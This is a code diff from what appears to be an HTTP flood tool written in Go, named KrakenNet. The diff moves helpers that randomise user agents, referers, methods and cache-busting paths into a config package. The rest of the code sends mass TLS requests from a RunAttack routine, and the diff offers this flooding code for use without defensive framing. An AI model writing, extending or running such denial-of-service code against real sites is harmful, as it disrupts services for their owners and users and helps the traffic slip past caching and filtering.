@@ -1,71 +1,20 @@
 package pkg
 
 import (
-	"bufio"
 	"crypto/tls"
 	"fmt"
-	color "github.com/vexsx/KrakenNet/config"
+	color "github.com/vexsx/KrakenNet/color"
+	"github.com/vexsx/KrakenNet/config"
 	"golang.org/x/net/context"
 	"golang.org/x/net/http2"
 	"io"
 	"math/rand"
 	"net"
 	"net/http"
-	"os"
-	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
 )
-
-var userAgents []string
-var referers []string
-var methodsHTTP = []string{"GET", "POST", "HEAD"}
-
-func loadListFromFile(filename string) []string {
-	file, err := os.Open(filename)
-	if err != nil {
-		return nil
-	}
-	defer file.Close()
-	var list []string
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			list = append(list, line)
-		}
-	}
-	return list
-}
-
-func randomFromList(list []string, fallback string) string {
-	if len(list) == 0 {
-		return fallback
-	}
-	return list[rand.Intn(len(list))]
-}
-
-func randomUserAgent() string {
-	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-}
-
-func randomReferer() string {
-	return randomFromList(referers, "https://google.com/")
-}
-
-func randomMethod() string {
-	return methodsHTTP[rand.Intn(len(methodsHTTP))]
-}
-
-func randomPath() string {
-	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, rand.Intn(10)+5)
-	for i := range b {
-		b[i] = chars[rand.Intn(len(chars))]
-	}
-	return "/" + string(b)
-}
 
 func newHTTPClientTLS(connections int) *http.Client {
 	tr := &http.Transport{
@@ -83,14 +32,14 @@ func newHTTPClientTLS(connections int) *http.Client {
 }
 
 func sendTLSRequest(client *http.Client, baseURL string) bool {
-	req, err := http.NewRequest(randomMethod(), baseURL+randomPath(), nil)
+	req, err := http.NewRequest(config.RandomMethod(), baseURL+config.RandomPath(), nil)
 	if err != nil {
 		return false
 	}
-	req.Header.Set("User-Agent", randomUserAgent())
+	req.Header.Set("User-Agent", config.RandomUserAgent())
 	req.Header.Set("Accept", "*/*")
 	req.Header.Set("Cache-Control", "no-cache")
-	req.Header.Set("Referer", randomReferer())
+	req.Header.Set("Referer", config.RandomReferer())
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -125,8 +74,6 @@ func formatBytes(bytes float64) string {
 
 func (in *Inputs) RunAttack() {
 	rand.Seed(time.Now().UnixNano())
-	userAgents = loadListFromFile("useragents.txt")
-	referers = loadListFromFile("referers.txt")
 	var durationSec int64
 
 	fmt.Println(color.Green + "🚀 Attack starting..." + color.Reset)
